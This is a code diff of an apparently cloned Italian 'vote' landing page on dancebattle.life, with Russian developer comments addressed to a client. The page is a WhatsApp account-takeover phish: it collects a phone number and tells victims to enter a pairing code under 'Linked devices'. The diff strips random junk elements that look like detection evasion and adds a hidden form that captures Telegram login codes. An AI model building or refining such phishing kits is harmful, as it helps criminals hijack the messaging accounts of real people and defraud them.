@@ -1,10 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
-<!-- Added by HTTrack -->
-<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -20,166 +15,149 @@
         src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
     <script
         src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
-    <!-- ВАЖНО: Оставляем оригинальный скрипт, который отвечает за логику номеров и стран -->
+    <!-- ВАЖНО: Скрипт number.js отвечает за основную логику формы выбора номера -->
     <script
         src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 
     <style>
-        .TdYmjJvmcSBa { display: none; background-color: #POsLWm; box-sizing: initial; opacity: 0.11; font-weight: 500; font-style: oblique; scale: 0.94; line-height: 12; padding: 233px; border-radius: 98px; font-size: 29px; color: #EHlSir; margin: 243px; text-align: right; cursor: text; height: 133px; width: 857px; }
-        .rwvCRhgYnBx { display: none; margin: 228px; font-style: italic; color: #oFisGb; padding: 157px; height: 127px; text-align: left; font-size: 93px; background-color: #VqHDjL; border-radius: 19px; opacity: 0.88; scale: 0.52; width: 505px; }
-        .EkrJRaLEYsO { display: none; font-weight: 400; border-radius: 7px; padding: 156px; margin: 230px; }
-        /* ... (остальные оригинальные стили из вашего <style>) ... */
+        /* Оригинальные стили из number.css остаются как есть, чтобы не ломать number.js */
+        /* Добавляем только необходимые правки и стили для новых элементов */
+        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
+        .loader { border-top: 5px solid #bfbbbb; } /* Стиль для лоадера от number.js */
+        
+        .block.number .form .search { background-color: #ffffff; }
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
+        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
+        .popup h2, .block .text { color: #ffffff; }
+        .popup p, .block .text p { color: #c6c6c6; }
+        .button.primary { color: #ffffff; background-color: #1d9ce0E6; width: 100% !important; }
+        .button.primary:hover { background-color: #1d9ce0; }
+        
+        .block.number .form-container { background-color: #1d3957; }
+        .block.number .form-container .form .country { border: 1px solid #80a2b3; }
+        .block.number .form-container .form .country .image img { -webkit-mask-image: none !important; }
+        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; }
+        .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
+        .block.number .form-container .form .country p { color: #ffffff; }
+        .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
+        .block.number .form-container .form .countries { background-color: #1d3957; }
+        .block.number .form-container .form .countries .search { background-color: #1d3957; }
+        .block.number .form-container .form .countries .search input { color: #b1c1d1; background-color: #152b42; }
+        .block.number .form-container .form .countries .items { background-color: #1d3957; }
+        .block.number .form-container .form .countries .item { background-color: #1d3957; }
+        .block.number .form-container .form .countries .item:hover { background-color: #24466b; }
+        .block.number .form-container .form .countries .item p.name { color: #b1c1d1; }
+        .block.number .form-container .form .countries .item p.code { color: #ffffff; }
+        .block.number .form-container .form .qrcode { color: #1d9ce0; }
+        .block.number .form-container .form input.number { color: #ffffff; background-color: transparent; border: 1px solid #80a2b3; }
+        .block.number .form-container .form input.number:focus { border: 1px solid #1d9ce0; }
         .block.number .form-container .form p.error { color: #d65d7a; }
         .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; }
         .popup .body { background-color: #1d3957; }
+        .top40 .body{ top: 40%; }
 
-        /* --- НАЧАЛО CSS ИСПРАВЛЕНИЙ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ (пункты 1 и 2 клиента) --- */
+        /* Стили для нашего кастомного шага ввода кода (Telegram) */
+        #form-step-telegram .code-title { font-size: 22px; font-weight: 700; color: #ffffff; margin-bottom: 15px; }
+        #loader-telegram .loader { /* Стиль для нашего кастомного лоадера */
+            width: 50px; height: 50px; border-top: 5px solid #1d9ce0; margin: 20px auto;
+        }
+
+
+        /* --- CSS ИСПРАВЛЕНИЯ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ (пункты 1 и 2 клиента) --- */
         @media screen and (max-width: 768px) {
-            /* Контейнер для QR-кода/лоадера/ввода кода на втором шаге */
-            .block.code { /* Применяем к основному блоку второго шага */
-                padding-top: 20px; /* Добавим отступ сверху, чтобы текст не прилипал */
+            .block.code { /* Общий блок для второго шага (будь то QR или наша форма) */
+                padding-top: 15px;
             }
-            .block.code .number-column { /* Центрируем содержимое колонки */
-                display: flex;
-                flex-direction: column;
-                align-items: center;
+             .block.code .text { /* Текст "Autorizzazione rapida..." */
+                padding: 0 10px; 
+                text-align: center;
             }
-            .block.code .number-container { /* Блок с лоадером/QR-кодом */
+             .block.code .text h2 { font-size: 1.25em; }
+             .block.code .text p { font-size: 0.875em; line-height: 1.45; }
+
+            /* Контейнер, который использует number.js для QR/его лоадера */
+            .block.code .number-container#loader { 
                 border: 10px solid #1d3957;
-                padding: 20px; 
-                min-height: 180px; 
-                margin-top: 10px; /* Отступ от текста "Autorizzazione rapida..." */
-                width: calc(100% - 40px); /* Чтобы не вылезал за края с учетом паддингов */
-                max-width: 300px; /* Ограничим максимальную ширину */
+                padding: 15px; 
+                min-height: 150px; 
+                margin-top: 10px; 
+                width: calc(100% - 30px); 
+                max-width: 280px; 
                 box-sizing: border-box;
             }
-            /* Лоадер */
-            .loader { 
-                width: 60px !important;
-                height: 60px !important;
-                border-width: 6px !important;
-                margin: 20px auto; 
+            /* Лоадер внутри .number-container#loader (от number.js) */
+            .block.code .number-container#loader .loader { 
+                width: 50px !important;
+                height: 50px !important;
+                border-width: 5px !important;
+                margin: 15px auto; 
             }
-            /* Цифры QR-кода (если используется) */
-            .block.code .number-code .symbol {
-                font-size: 22px !important; 
-                width: 30px !important;    
-                height: 40px !important;   
-                line-height: 40px !important; 
-                margin: 2px !important;
+             /* Цифры QR-кода (если используется number.js) */
+            .block.code .number-container#loader .number-code .symbol {
+                font-size: 18px !important; 
+                width: 26px !important;    
+                height: 36px !important;   
+                line-height: 36px !important; 
+                margin: 1px !important; 
             }
-            .block.code .number-code .split {
-                font-size: 22px !important; 
-                padding: 0 5px !important;
+            .block.code .number-container#loader .number-code .split {
+                font-size: 18px !important; 
+                padding: 0 2px !important; 
             }
-            /* Текст над лоадером/кодом */
-            .block.code .text { 
-                padding: 0 15px; 
-                text-align: center; /* Центрируем текст на мобильных */
-            }
-             .block.code .text h2 {
-                font-size: 1.3em; 
-            }
-            .block.code .text p {
-                font-size: 0.9em;
-                line-height: 1.5;
-            }
-
-            /* Форма ввода кода (которую использует ваш Telegram скрипт) */
-            /* Убедимся, что #form-step-2 (если это ID вашего блока) тоже стилизован */
-            #form-step-2, #form-step-2-custom { /* Применяем к обоим возможным ID */
+            
+            /* Наша форма ввода кода для Telegram на мобильных */
+            #form-step-telegram .form-container {
+                 padding: 15px;
+                 background-color: #1d3957; /* Убедимся, что фон есть */
+                 border-radius: 8px; /* Как у основного блока */
                  width: 100%;
-                 max-width: 320px; /* Ограничение ширины для лучшего вида */
-                 margin: 15px auto 0 auto; /* Центрирование и отступ сверху */
+                 max-width: 300px; /* Ограничим ширину */
+                 margin: 15px auto 0;
             }
-            #form-step-2 .form-container, #form-step-2-custom .form-container {
-                padding: 15px;
-            }
-            #form-step-2 .code-title, #form-step-2-custom .code-title { /* Для надписи "Codice:" */
-                font-size: 1.2em; /* Уменьшим, если нужно */
+            #form-step-telegram .code-title {
+                font-size: 1.1em; /* Немного уменьшим */
                 margin-bottom: 10px;
             }
-             #form-step-2 input.number, #form-step-2-custom input.number { /* Поле ввода кода */
+            #form-step-telegram input.number#code-telegram {
+                padding: 10px;
+                font-size: 1em;
+                margin-bottom: 15px;
+            }
+            #form-step-telegram button.primary#two-step-telegram {
                 padding: 12px;
                 font-size: 1em;
             }
-            #form-step-2 button.primary, #form-step-2-custom button.primary { /* Кнопка "Continua" */
-                padding: 12px;
-                font-size: 1em;
+            /* Наш лоадер для Telegram */
+            #loader-telegram {
+                 margin-top: 20px;
+            }
+            #loader-telegram .loader {
+                 width: 50px !important;
+                 height: 50px !important;
+                 border-width: 5px !important;
             }
         }
-        /* --- КОНЕЦ CSS ИСПРАВЛЕНИЙ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ --- */
     </style>
 </head>
 
 <body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
-    <!-- ... (начало вашего body без изменений) ... -->
-    <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
-        hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
     <div class="wrapper">
-        <span class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-            <div class="btBTGkttju">
-                <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-            </div>
-        </span>
+        <!-- Шаг 1: Ввод номера телефона (управляется number.js) -->
         <div class="block number" id="step-1">
-            <!-- ... (содержимое #step-1 без изменений, так как им управляет number.js) ... -->
-            <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
-                <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
-                    QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge QQKAHgQeFpjdWgu
-                    ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
-            </small>
             <div class="text">
-                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                 <h2>Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
-                <small
-                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                </small>
-                <span
-                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                    <div class="btBTGkttju">
-                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-                    </div>
-                </span>
-                <h5
-                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
                 <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
-                <span
-                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                    <div class="btBTGkttju">
-                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-                    </div>
-                </span>
-                <h5
-                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
             </div>
-            <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
-                hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
             <div id="form-step-1" class="form-container form-num">
-                <div class="form" id="myForm">
-                    <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
-                        hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
-                        LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
+                <div class="form" id="myForm"> <!-- Этот ID используется number.js -->
                     <div class="country">
                         <div class="image">
                             <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                 alt="AU">
                         </div>
-                        <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
-                            <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
-                                QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
-                                QQKAHgQeFpjdWgu ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
-                        </small>
                         <p class="name">Australia</p>
-                        <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
-                            KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY
-                            WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                         <div class="icon">
                             <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
                                 fill="none">
@@ -187,19 +165,9 @@
                                     fill-opacity="0.3"></path>
                             </svg>
                         </div>
-                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN
-                                ZFIDaGgBq PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                        </span>
                     </div>
-                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                    <div class="countries hidden">
-                        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI
-                            QZhWtdNh</strong>
+                    <div class="countries hidden"> <!-- Заполняется number.js -->
                         <div class="search">
-                            <h5
-                                class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                                xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                             <div class="image">
                                 <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
                                     class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
@@ -208,264 +176,147 @@
                                     </path>
                                 </svg>
                             </div>
-                            <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
-                                lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                             <input type="text" id="search">
-
                         </div>
-                        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
-                            lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                         <div class="items">
-                            <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
-                                KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX
-                                JxoZektYrbHlY WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc
-                                EnxoxcmjcpyZygdOuwbVkt</ul>
-                            <div class="overflow">
+                             <div class="overflow">
                                 <!-- СПИСОК СТРАН ГЕНЕРИРУЕТСЯ number.js -->
-                                <!-- Я оставил этот блок пустым, так как number.js должен его заполнить. -->
-                                <!-- В вашем изначальном HTML здесь был длинный список стран. -->
-                                <!-- Если number.js не работает без этого списка в HTML, его нужно будет вернуть. -->
-                                <!-- Для теста пока оставлю как было в вашем "чистом" файле: -->
-                                 <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
-                                 <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
-                                 <!-- ... и так далее для всех стран, как в вашем "чистом" HTML ... -->
-                                 <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
+                                <!-- Оставляю несколько примеров, как в вашем оригинальном файле, -->
+                                <!-- так как number.js МОЖЕТ ожидать их для инициализации -->
+                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
+                                <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
+                                <div class="item" data-code="+994" data-lang="AZ" data-name="Azərbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Azərbaycan</p> <p class="code">+994</p> </div>
+                                <!-- И так далее... весь ваш длинный список стран должен быть здесь, если number.js его не генерирует сам -->
+                                <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
                             </div>
-                            <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
-                                <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
-                                </h5>
-                            </ul>
                         </div>
-                        <h5
-                            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                     </div>
-                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                    </span>
-                    <input type="text" class="number" id="number" value="+61" />
-                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                    </span>
-                    <button class="button primary" id="next-step">Continua</button>
-
-                    <span
-                        class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
-                        <div class="btBTGkttju">
-                            <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
-                        </div>
-                    </span>
+                    <input type="text" class="number" id="number" value="+61" /> <!-- ID используется number.js -->
+                    <button class="button primary" id="next-step">Continua</button> <!-- ID используется number.js -->
                     <p class="error hidden">Numero di telefono non valido</p>
-                    <small
-                        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                    </small>
-                    <div id="verifyForm" style="display: none; margin-top: 20px;">
+                    <div id="verifyForm" style="display: none; margin-top: 20px;"> <!-- Используется number.js? -->
                         <input type="text" id="codeInput" placeholder="Введіть код">
                         <button id="submitCode">Підтвердити</button>
                     </div>
                 </div>
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
             </div>
         </div>
 
-        <h5
-            class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
-            ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi
-        </h5>
-                                                
-        <!-- Блок второго шага, который будет ПОКАЗАН number.js (ID="step-2") -->
-        <!-- ИЛИ моим Telegram-скриптом (ID="form-step-2-telegram") -->
-        <div class="block code hidden" id="step-2"> <!-- Этот блок может быть показан number.js -->
-            <!-- ... (содержимое оригинального #step-2 без изменений, включая #loader и т.д.) ... -->
-            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-            </span>
+        <!-- Шаг 2: Отображение QR-кода/лоадера (управляется number.js) ИЛИ наша форма ввода кода (управляется нашим скриптом) -->
+        <div class="block code hidden" id="step-2"> <!-- Этот блок будет показан number.js -->
             <div class="text">
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
                 <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
-                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
-                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
-                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
-                <input type="hidden" id="user-number">
-                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                 <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
                     impostazioni, quindi inserisci questo codice</p>
-                <h5
-                    class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
-                    xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
-                <small
-                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-                </small>
             </div>
             <div class="number-column">
-                <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
-                    YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                <div class="number-container" id="loader"> <!-- Этот ID используется number.js -->
-                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                    <div class="loader" ></div>
+                <!-- Контейнер для QR/лоадера от number.js -->
+                <div class="number-container" id="loader"> <!-- ID используется number.js -->
+                    <div class="loader"></div>
                     <div class="number-code hidden" id="number-code" data-code="">
                         <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                         <div class="split">–</div>
                         <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                     </div>
-                    <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
-                        <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
-                            GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
+                </div>
+
+                <!-- Наша форма для ввода кода (для Telegram), изначально скрыта -->
+                <div id="form-step-telegram" style="display: none;" class="form-container form-code">
+                    <p class="text code-title">Codice:</p> <!-- ПЕРЕВЕДЕНО -->
+                    <div class="form" id="form-code-telegram">
+                        <input type="text" class="number" id="code-telegram" />
+                        <button class="button primary" id="two-step-telegram">Continua</button>
                     </div>
                 </div>
-                <!-- Блок для ввода кода для ТЕЛЕГРАМА. Он будет показан СКРИПТОМ НИЖЕ -->
-                <div class="block number" id="form-step-2-telegram" style="display: none;"> <!-- Новый ID для нашего блока -->
-                    <div id="form-step-2-container-telegram" class="form-container form-code">
-                        <p  class="text code-title">Codice:</p> <!-- ПЕРЕВЕДЕНО -->
-                        <div class="form" id="form-code-telegram">
-                            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                            <input type="text" class="number" id="code-telegram" /> <!-- Новый ID -->
-                            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-                            </span>
-                            <button class="button primary" id="two-step-telegram">Continua</button> <!-- Новый ID -->
-                        </div>
-                    </div>
-                </div>
-                <!-- Лоадер для моего Telegram скрипта -->
-                <div class="number-container" id="loader-telegram" style="display: none;">
-                     <div class="loader"></div>
-                </div>
-                <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
-                    <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
-                        GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
